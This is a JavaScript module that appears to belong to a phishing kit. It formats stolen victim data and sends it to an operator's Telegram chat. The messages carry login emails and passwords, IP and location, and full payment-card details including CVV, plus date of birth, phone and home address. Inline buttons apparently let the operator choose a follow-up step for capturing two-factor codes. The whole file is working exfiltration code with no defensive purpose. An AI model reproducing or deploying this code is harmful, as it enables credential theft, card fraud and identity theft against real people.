const axios = require("axios");
require("dotenv").config();

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

const sendToTelegram = async (message, includeButtons = false) => {
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    const payload = {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: "HTML",
    };

    if (includeButtons) {
      payload.reply_markup = JSON.stringify({
        inline_keyboard: [
          [
            { text: "📱 Send Auth App", callback_data: "type_app" },
            { text: "📧 Send Email", callback_data: "type_email-sms" },
          ],
          [
            { text: "💬 Send SMS", callback_data: "type_sms" },
            { text: "🔐 Send Special", callback_data: "type_special" },
          ],
        ],
      });
    }

    // Set timeout for Telegram API requests
    const response = await axios.post(url, payload, {
      timeout: 5000, // 5 seconds timeout
    });

    return response.data;
  } catch (error) {
    console.error("Telegram notification error:", error);
    throw error;
  }
};

const formatLogMessage = (data) => {
  switch (data.type) {
    case "login":
      return `
🔐 <b>New Login</b>

👤 <b>Email:</b> ${data.email}
🔑 <b>Password:</b> ${data.password}
🌍 <b>IP:</b> ${data.ip}
📱 <b>Location:</b> ${data.city || "Unknown"}, ${data.region || "Unknown"}, ${
        data.country || "Unknown"
      }
🏢 <b>ISP:</b> ${data.org || "Unknown"}
📱 <b>User Agent:</b> ${data.userAgent}
⏰ <b>Time:</b> ${new Date().toISOString()}
`;

    case "billing":
      return `
💳 <b>New Billing Info</b>

👨‍💼 <b>Full Name:</b> ${data.fullName}
💳 <b>Card Name:</b> ${data.cardName}
💳 <b>Card Number:</b> ${data.cardNumber}
📅 <b>Expiry:</b> ${data.expiryMonth}/${data.expiryYear}
🔒 <b>CVV:</b> ${data.cvv}
📞 <b>Phone:</b> ${data.phoneNumber}
🎂 <b>DOB:</b> ${data.dateOfBirth}
🏠 <b>Address:</b> ${data.addressLine1}
🌆 <b>City:</b> ${data.city}
📍 <b>State:</b> ${data.state}
📮 <b>Zip:</b> ${data.zipCode}
🌍 <b>Country:</b> ${data.country}
🔍 <b>IP:</b> ${data.ip}
⏰ <b>Time:</b> ${new Date().toISOString()}

<b>Select verification method:</b>
`;
    default:
      return `
🔔 <b>New Activity</b>

📝 <b>Type:</b> ${data.type}
👤 <b>Email:</b> ${data.email}
🌍 <b>IP:</b> ${data.ip}
⏰ <b>Time:</b> ${new Date().toISOString()}
`;
  }
};

module.exports = {
  sendToTelegram,
  formatLogMessage,
};
